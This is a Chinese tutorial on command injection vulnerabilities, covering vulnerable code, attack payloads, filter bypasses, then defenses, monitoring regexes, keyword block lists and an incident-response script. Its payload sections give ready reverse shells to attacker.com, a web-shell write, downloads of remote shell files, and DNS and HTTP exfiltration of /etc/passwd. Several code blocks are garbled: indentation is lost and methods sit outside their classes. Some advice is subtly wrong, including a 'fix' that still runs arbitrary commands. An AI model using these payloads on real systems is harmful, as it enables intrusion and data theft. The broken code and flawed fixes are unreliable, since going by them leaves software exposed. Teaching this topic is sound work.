# 命令执行漏洞

## 1. 命令执行漏洞原理

### 1.1 基本概念

命令执行漏洞是指应用程序在调用系统命令时，未对用户输入进行充分过滤，导致攻击者可以执行任意系统命令，从而控制服务器。

### 1.2 产生原因

- **用户输入直接拼接到系统命令中**

- **使用危险的函数执行命令**

- **输入验证不充分**

- **权限设置不当**

### 1.3 攻击流程

`攻击者构造恶意命令 → 应用程序拼接命令 → 系统执行命令 → 返回命令执行结果`

## 2. 命令执行漏洞分类

### 2.1 代码注入命令执行

#### 2.1.1 PHP命令执行

```php
<?php
system($_GET['cmd']);
exec($_GET['cmd']);
shell_exec($_GET['cmd']);
passthru($_GET['cmd']);
`$_GET['cmd']`;  // 反引号执行
?>
```

#### 2.1.2 Python命令执行

```python
import os
os.system(request.args.get('cmd'))
os.popen(request.args.get('cmd')).read()
subprocess.call(request.args.get('cmd'), shell=True)
```

#### 2.1.3 Java命令执行

```java
Runtime.getRuntime().exec(request.getParameter("cmd"));
ProcessBuilder pb = new ProcessBuilder(request.getParameter("cmd"));
```

#### 2.1.4 Node.js命令执行

```javascript
const { exec } = require('child_process');
exec(req.query.cmd);
```

### 2.2 模板注入命令执行

#### 2.2.1 Twig (PHP)

```php
$twig = new Twig_Environment(new Twig_Loader_String());
$output = $twig->render("Hello {{ $_GET['name'] }}");
// 攻击: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

#### 2.2.2 Jinja2 (Python)

```python
from jinja2 import Template
template = Template("Hello {{ name }}")
output = template.render(name=request.args.get('name'))
# 攻击: {{ config.items() }} 或 {{ ''.__class__.__mro__[1].__subclasses__() }}
```

#### 2.2.3 Freemarker (Java)

```java
Template template = cfg.getTemplate("test.ftl");
template.process(data, out);
// 攻击: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

### 2.3 反序列化命令执行

#### 2.3.1 PHP反序列化

```php
$data = unserialize($_GET['data']);
// 利用__destruct、__wakeup等魔术方法
```

#### 2.3.2 Java反序列化

```java
ObjectInputStream in = new ObjectInputStream(inputStream);
Object obj = in.readObject();
// 利用Apache Commons Collections等gadget链
```

#### 2.3.3 Python反序列化

```python
import pickle
data = pickle.loads(request.data)
```

## 3. 常见攻击载荷

### 3.1 基础命令执行

#### 3.1.1 Linux系统命令

```bash
;id
|id
&&id
||id
`id`
$(id)
```

#### 3.1.2 Windows系统命令

```cmd
|ipconfig
&ipconfig
&&ipconfig
||ipconfig
%cd%
```

### 3.2 命令链执行

#### 3.2.1 Linux命令分隔符

```bash
; command # 顺序执行
| command # 管道
&& command # 前一个成功则执行
|| command # 前一个失败则执行
```

#### 3.2.2 多命令执行

```bash
cat /etc/passwd; whoami; id
cat /etc/passwd && whoami || id
```

### 3.3 反弹Shell

#### 3.3.1 Bash反弹

```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

#### 3.3.2 Netcat反弹

```bash
nc -e /bin/sh attacker.com 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

#### 3.3.3 Python反弹

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### 3.3.4 PHP反弹

```php
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 3.4 文件操作命令

#### 3.4.1 读取文件

```bash
cat /etc/passwd
more /etc/passwd
less /etc/passwd
head /etc/passwd
tail /etc/passwd
```

#### 3.4.2 写入文件

```bash
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
```

#### 3.4.3 下载文件

```bash
wget http://attacker.com/shell.php -O /tmp/shell.php
curl http://attacker.com/shell.php -o /tmp/shell.php
```

## 4. 绕过技术

### 4.1 空格绕过

#### 4.1.1 使用制表符

```bash
cat<>/etc/passwd
cat${IFS}/etc/passwd
{X,cat,/etc/passwd}
```

#### 4.1.2 使用变量

```bash
X=$'cat\x20/etc/passwd' && $X
```

#### 4.1.3 重定向

```bash
cat</etc/passwd
```

### 4.2 黑名单关键字绕过

#### 4.2.1 通配符

```bash
/bin/cat /etc/passwd
c''a''t /etc/passwd
c\a\t /etc/passwd
```

#### 4.2.2 变量拼接

```bash
a=c;b=at;c=/etc/passwd;$a$b $c
```

#### 4.2.3 编码绕过

```bash
echo 'cat /etc/passwd' | base64
# 然后执行
echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d | bash
```

#### 4.2.4 十六进制编码

```bash
echo "636174202f6574632f706173737764" | xxd -r -p | bash
```

#### 4.2.5 引号绕过

```bash
c'a't /etc/passwd
c"a"t /etc/passwd
```

### 4.3 长度限制绕过

#### 4.3.1 文件写入

```bash
# 将命令写入文件，然后执行
echo -e '#!/bin/sh\ncat /etc/passwd' > /tmp/test.sh
chmod +x /tmp/test.sh
/tmp/test.sh
```

#### 4.3.2 命令替换

```bash
# 使用短命令
wget attacker.com/shell.sh -O /tmp/s; sh /tmp/s
```

#### 4.3.3 环境变量

```bash
# 通过环境变量存储命令
export CMD="cat /etc/passwd"
bash -c "$CMD"
```

### 4.4 无回显命令执行

#### 4.4.1 时间盲注

```bash
sleep 5
ping -c 5 127.0.0.1
```

#### 4.4.2 DNS外带数据

```bash
nslookup `whoami`.attacker.com
ping `whoami`.attacker.com
```

#### 4.4.3 HTTP外带数据

```bash
curl http://attacker.com/$(whoami)
wget http://attacker.com/$(cat /etc/passwd | base64)
```

#### 4.4.4 文件写入外带

```bash
id > /tmp/result.txt
cat /etc/passwd > /var/www/html/result.txt
```

## 5. 防御措施

### 5.1 输入验证

#### 5.1.1 白名单验证

```php
function validateInput($input) {
    $allowed_commands = ['ls', 'pwd', 'whoami'];
    if (in_array($input, $allowed_commands)) {
        return $input;
    } else {
        die('Invalid command');
    }
}
```

#### 5.1.2 正则表达式过滤

```php
function sanitizeCommand($input) {
    // 过滤危险字符
    $dangerous_chars = [';', '|', '&', '`', '$', '(', ')', '<', '>', '!', "\n", "\r"];
    $filtered = str_replace($dangerous_chars, '', $input);

    // 过滤命令注入关键词
    $dangerous_keywords = ['exec', 'system', 'passthru', 'shell_exec', 'proc_open', 'popen'];
    foreach ($dangerous_keywords as $keyword) {
        if (stripos($filtered, $keyword) !== false) {
            die('Dangerous keyword detected');
        }
    }

    return $filtered;
}
```

### 5.2 使用安全的API

#### 5.2.1 参数化命令执行

```php
// 不安全的做法
system("ls " . $_GET['dir']);

// 安全的做法
$dir = $_GET['dir'];
$output = []; $return_code = 0;
exec("ls -- " . escapeshellarg($dir), $output, $return_code);
```

#### 5.2.2 使用语言内置函数

```php
// 使用PHP内置函数代替系统命令
$files = scandir('/path/to/dir'); 
$file_content = file_get_contents('/path/to/file');
```

#### 5.2.3 Python安全示例

```python
import subprocess

# 不安全
subprocess.call(f"ls {user_input}", shell=True)

# 安全
subprocess.call(["ls", user_input])  # 不使用shell
subprocess.call(["ls", "--", user_input])  # 使用参数分隔符
```

### 5.3 最小权限原则

#### 5.3.1 使用低权限用户

```bash
# 创建专用用户
useradd -r -s /bin/false webuser
chown -R webuser:webuser /var/www/html
```

#### 5.3.2 容器权限限制

```dockerfile
# Dockerfile
FROM php:8.1-apache

# 创建非root用户
RUN useradd -r -u 1000 -g www-data appuser
USER appuser

# 限制能力
RUN setcap -r /bin/bash
```

### 5.4 沙箱环境

#### 5.4.1 使用chroot

```php
function executeInChroot($command, $chroot_dir) {
    $chroot_command = "chroot {$chroot_dir} {$command}";
    return shell_exec($chroot_command);
}
```

#### 5.4.2 Docker沙箱

```python
import docker

def safe_execute(command):
 client = docker.from_env()
 container = client.containers.run(
 "alpine:latest",
 command,
 detach=True,
 remove=True,
 network_mode='none', # 禁用网络
 read_only=True, # 只读文件系统
 cap_drop=['ALL'] # 删除所有权限
 )
 return container.logs()
```

### 5.5 安全配置

#### 5.5.1 PHP安全配置

```ini
; php.ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
disable_classes =
open_basedir = "/var/www/html:/tmp"
```

#### 5.5.2 Web服务器配置

```nginx
# nginx配置
location ~ \.php$ {
    # 限制请求体大小
    client_max_body_size 10M;

    # 隐藏版本信息
    server_tokens off;

    # 安全头
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
}
```

## 6. 安全编码实践

### 6.1 命令执行安全类

```php
class SecureCommandExecutor {
    private $allowed_commands;
    private $timeout;

    public function __construct(array $allowed_commands, $timeout = 30) {
        $this->allowed_commands = $allowed_commands;
        $this->timeout = $timeout;
    }

    public function execute($command, $arguments = []) {
        // 验证命令
        if (!in_array($command, $this->allowed_commands)) {
            throw new InvalidArgumentException('Command not allowed');
        }

        // 转义参数
        $escaped_arguments = array_map('escapeshellarg', $arguments);

        // 构建完整命令
        $full_command = $command . ' ' . implode(' ', $escaped_arguments);

        // 设置超时
        $descriptorspec = [
            0 => ["pipe", "r"],  // stdin
            1 => ["pipe", "w"],  // stdout
            2 => ["pipe", "w"]   // stderr
        ];

        $process = proc_open($full_command, $descriptorspec, $pipes);

        if (!is_resource($process)) {
            throw new RuntimeException('Failed to execute command');
        }

        // 设置超时
        $start_time = time();
        $output = '';
        $error = '';

        while (true) {
            $status = proc_get_status($process);

            if (!$status['running']) {
                break;
            }

            if (time() - $start_time > $this->timeout) {
                proc_terminate($process);
                throw new RuntimeException('Command execution timeout');
            }

            usleep(100000); // 100ms
        }

        // 读取输出
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);

        // 关闭管道
        foreach ($pipes as $pipe) {
            fclose($pipe);
        }

        $return_value = proc_close($process);

        return [
            'output' => $output,
            'error' => $error,
            'return_code' => $return_value
        ];
    }
}

// 使用示例
$executor = new SecureCommandExecutor(['ls', 'pwd', 'whoami']);
try {
    $result = $executor->execute('ls', ['-la', '/var/www/html']);
    echo $result['output'];
} catch (Exception $e) {
    error_log("Command execution failed: " . $e->getMessage());
}
```

### 6.2 输入验证框架

```python
import re
import shlex
from typing import List

class CommandValidator:
    def __init__(self, allowed_commands: List[str], max_args: int = 10):
        self.allowed_commands = allowed_commands
        self.max_args = max_args
        self.dangerous_patterns = [
            r'[;&|`$]',  # 命令分隔符
            r'\.\./',    # 路径遍历
            r'>|<',      # 重定向
            r'\$\(',     # 命令替换
        ]

    def validate(self, command_string: str) -> bool:
        # 检查危险模式
        for pattern in self.dangerous_patterns:
            if re.search(pattern, command_string):
                return False

        try:
            # 解析命令
            parts = shlex.split(command_string)
            if not parts:
                return False

            # 检查命令是否允许
            if parts[0] not in self.allowed_commands:
                return False

            # 检查参数数量
            if len(parts) > self.max_args + 1:
                return False

            return True
        except ValueError:
            return False

# 使用示例
validator = CommandValidator(['ls', 'cat', 'find'])
if validator.validate(user_input):
    # 安全执行命令
    pass
else:
    print("Invalid command")
```

## 7. 检测和测试

### 7.1 手动测试Payloads

#### 7.1.1 基础测试

```bash
;id
|id
`id`
$(id)
{{7*7}}
```

#### 7.1.2 盲注测试

```bash
sleep 5
ping -c 5 127.0.0.1
```

#### 7.1.3 文件操作测试

```bash
cat /etc/passwd
ls -la /
whoami
```

### 7.2 自动化测试工具

#### 7.2.1 专用工具

- **Commix** - 自动化命令注入工具

- **Sqlmap** - 也可以检测命令注入

- **Burp Suite** - 包含命令注入扫描模块

#### 7.2.2 自定义测试脚本

```python
import requests
import urllib.parse
import time

class CommandInjectionTester:
 def __init__(self, target_url, param_name):
 self.target_url = target_url
 self.param_name = param_name
 self.session = requests.Session()
```

def test_basic_injection(self):
    payloads = [
        ';id',
        '|id',
        '`id`',
        '$(id)',
        '{{7*7}}'
    ]

    for payload in payloads:
        params = {self.param_name: payload}
        response = self.session.get(self.target_url, params=params)
    
        if 'uid=' in response.text or 'gid=' in response.text:
            print(f"Basic injection vulnerable: {payload}")
            return True
    
    return False

def test_blind_injection(self):
    start_time = time.time()
    payloads = [
        ';sleep 5',
        '|sleep 5',
        '`sleep 5`',
        '$(sleep 5)'
    ]

    for payload in payloads:
        try:
            params = {self.param_name: payload}
            response = self.session.get(self.target_url, params=params, timeout=3)
        except requests.exceptions.Timeout:
            if time.time() - start_time > 4:
                print(f"Blind injection vulnerable: {payload}")
                return True
    
    return False

def test_os_identification(self):
    linux_payload = ';cat /etc/passwd'
    windows_payload = ';type C:\\Windows\\win.ini'

    params = {self.param_name: linux_payload}
    response = self.session.get(self.target_url, params=params)
    
    if 'root:' in response.text:
        print("Linux system detected")
        return 'linux'
    
    params = {self.param_name: windows_payload}
    response = self.session.get(self.target_url, params=params)
    
    if 'boot loader' in response.text:
        print("Windows system detected")
        return 'windows'
    
    return 'unknown'

```

```

## 8. 日志和监控

### 8.1 命令执行监控

```python
import logging
import re
from datetime import datetime

class CommandExecutionMonitor:
 def __init__(self):
 self.logger = logging.getLogger('command_monitor')
 self.suspicious_patterns = [
 r'[;&|`\$\n]', # 命令分隔符
 r'(wget|curl)\s+http', # 下载文件
 r'/bin/(ba)?sh', # 启动shell
 r'nc\s+.*\s+\d+', # netcat连接
 r'chmod\s+[0-7]{3,4}', # 修改权限
 ]
```

def log_command_execution(self, command, user_ip, user_agent):
    # 检查可疑模式
    for pattern in self.suspicious_patterns:
        if re.search(pattern, command, re.IGNORECASE):
            self.alert_suspicious_command(command, user_ip, user_agent)
            break

    # 记录所有命令执行
    self.logger.info(f"Command executed: {command} by {user_ip} - {user_agent}")

def alert_suspicious_command(self, command, user_ip, user_agent):
    alert_message = f"""
    SUSPICIOUS COMMAND EXECUTION DETECTED!
    Time: {datetime.now()}
    Command: {command}
    IP: {user_ip}
    User-Agent: {user_agent}
    """

    # 发送警报
    print(alert_message)
    # 可以集成邮件、Slack等通知方式

```

```

### 8.2 实时阻断

```python
import re
from flask import request, abort

def command_injection_protection():
    """
    Flask中间件，检测和阻断命令注入攻击
    """
    suspicious_keywords = [
        ';', '|', '&', '`', '$', '(', ')', '<', '>',
        'sleep', 'wget', 'curl', 'nc', 'netcat',
        '/bin/bash', '/bin/sh', 'chmod', 'chown'
    ]

    # 检查GET参数
    for key, value in request.args.items():
        if any(keyword in str(value).lower() for keyword in suspicious_keywords):
            abort(403, description="Potential command injection detected")

    # 检查POST参数
    if request.is_json:
        for key, value in request.get_json().items():
            if any(keyword in str(value).lower() for keyword in suspicious_keywords):
                abort(403, description="Potential command injection detected")
```

## 9. 应急响应

### 9.1 检测到命令执行攻击

1. **立即阻断攻击者IP**

2. **检查系统日志和Web日志**

3. **审查被执行的命令**

4. **检查系统是否被植入后门**

5. **检查用户账户和权限**

### 9.2 入侵检测脚本

```bash
#!/bin/bash
# intrusion_detection.sh

echo "=== Command Injection Incident Response ==="

# 1. 检查最近执行的命令
echo "1. Recent commands:"
history | tail -20

# 2. 检查网络连接
echo "2. Network connections:"
netstat -tunap | grep ESTABLISHED

# 3. 检查进程
echo "3. Running processes:"
ps aux | head -20

# 4. 检查计划任务
echo "4. Cron jobs:"
crontab -l
ls -la /etc/cron*

# 5. 检查后门文件
echo "5. Suspicious files:"
find /var/www/html -name "*.php" -exec grep -l "system\|exec\|shell_exec" {} \;
find /tmp /var/tmp -type f -mtime -1

# 6. 检查用户账户
echo "6. User accounts:"
cat /etc/passwd | grep -E ":/bin/(bash|sh)"
```

### 9.3 修复流程

```php
// 1. 识别漏洞点
$vulnerable_code = system($_GET['cmd']);

// 2. 实施修复
if (preg_match('/^[a-zA-Z0-9_-]+$/', $_GET['cmd'])) {
 $safe_command = escapeshellcmd($_GET['cmd']);
 system($safe_command);
} else {
 die('Invalid command');
}

// 3. 验证修复
// 测试各种绕过技术是否有效
```

## 10. 云环境特殊考虑

### 10.1 云元数据保护

```python
import requests

def protect_cloud_metadata():
 """
 防止通过命令执行访问云元数据
 """
 metadata_urls = [
 'http://169.254.169.254/',
 'http://metadata.google.internal/',
 'http://169.254.169.254/latest/meta-data/',
 'http://169.254.169.254/latest/user-data/'
 ]
#在命令执行前检查是否访问元数据

user_command = get_user_input()

for url in metadata_urls:
 if url in user_command:
 raise SecurityException("Cloud metadata access attempt blocked") 
```

### 10.2 容器安全配置

```yaml
# docker-compose.yml 安全配置
version: '3'
services:
  webapp:
    image: myapp:latest
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    read_only: true
    tmpfs:
      - /tmp:rw,noexec,nosuid
    networks:
      - frontend
```

# 